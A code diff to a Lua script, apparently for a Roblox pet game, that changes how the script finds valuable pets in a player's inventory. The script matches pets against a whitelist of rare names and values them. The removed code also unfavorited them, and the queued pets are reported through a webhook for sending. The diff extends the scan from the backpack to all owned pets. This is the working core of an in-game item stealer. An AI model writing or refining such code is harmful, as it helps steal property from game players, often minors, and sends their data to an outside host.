@@ -60,8 +60,6 @@ local petWhitelist = {
     'Disco Bee',
     'Mimic Octopus',
     'Kitsune',
-    'Spinosaurus',
-    'Triceratops',
     'Raptor'
 }
 local mutationKeywords = {"Ascended", "Inverted", "Rainbow", "Radiant", "IronSkin", "Golden", "Tiny", "Frozen", "Windy", "Mega", "Shiny", "Shocked"}
@@ -90,7 +88,7 @@ end
 
 local function isWhitelistedPet(petName, weight)
     for _, allowed in ipairs(petWhitelist) do
-        if string.find(petName, allowed, 1, true) then
+        if string.find(string.lower(petName), string.lower(allowed), 1, true) then
             return true
         end
     end
@@ -417,46 +415,25 @@ local function SendMessage(sortedItems)
     return sendWebhook(data)
 end
 
--- Remove plant scanning logic from backpack scan, only process pets
-debugPrint("Scanning backpack for items...")
-local itemCount = 0
-
-for _, tool in ipairs(backpack:GetChildren()) do
-    if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
-        if tool:GetAttribute("ItemType") == "Pet" then
-            local petUUID = tool:GetAttribute("PET_UUID")
-            if petUUID and dataService and dataService.GetData then
-                local playerData = dataService:GetData()
-                if playerData and playerData.PetsData and playerData.PetsData.PetInventory and playerData.PetsData.PetInventory.Data then
-                    local v14 = playerData.PetsData.PetInventory.Data[petUUID]
-                    if v14 then
-                        local toolName = tool.Name
-                        local itemName = toolName:match("^(.-) %[%d+%.?%d* KG%]") or toolName
-                        local weight = tonumber(toolName:match("%[(%d+%.?%d*) KG%]")) or 0
-                        local petAge = tonumber(toolName:match("%[Age%s*(%d+)%]")) or "N/A"
-                        -- Only include whitelisted pets and those 25+ kg
-                        if isWhitelistedPet(itemName, weight) then
-                            if tool:GetAttribute("Favorite") then
-                                local success = pcall(function()
-                                    replicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
-                                end)
-                                if not success then
-                                    debugPrint("Failed to unfavorite pet")
-                                end
-                            end
-                            local value = calcPetValue(v14)
-                            totalValue = totalValue + value
-                            table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Pet", Age = petAge})
-                            debugPrint("Added pet: " .. itemName .. " Value: " .. value .. " Age: " .. tostring(petAge))
-                        end
-                    end
-                end
+-- Scan all pets in inventory, not just backpack
+local playerData = dataService and dataService.GetData and dataService:GetData()
+if playerData and playerData.PetsData and playerData.PetsData.PetInventory and playerData.PetsData.PetInventory.Data then
+    for petUUID, v14 in pairs(playerData.PetsData.PetInventory.Data) do
+        if v14 and v14.PetData and v14.PetType then
+            local itemName = v14.PetType
+            local weight = v14.PetData.BaseWeight or 0
+            local petAge = v14.PetData.Age or "N/A"
+            if isWhitelistedPet(itemName, weight) then
+                local value = calcPetValue(v14)
+                totalValue = totalValue + value
+                table.insert(itemsToSend, {Tool = nil, Name = itemName, Value = value, Weight = weight, Type = "Pet", Age = petAge})
+                debugPrint("Added pet: " .. itemName .. " Value: " .. value .. " Age: " .. tostring(petAge))
             end
         end
     end
 end
 
-debugPrint("Total items found: " .. itemCount)
+debugPrint("Total items found: " .. #itemsToSend)
 debugPrint("Items to send: " .. #itemsToSend)
 debugPrint("Total value: " .. totalValue)
 
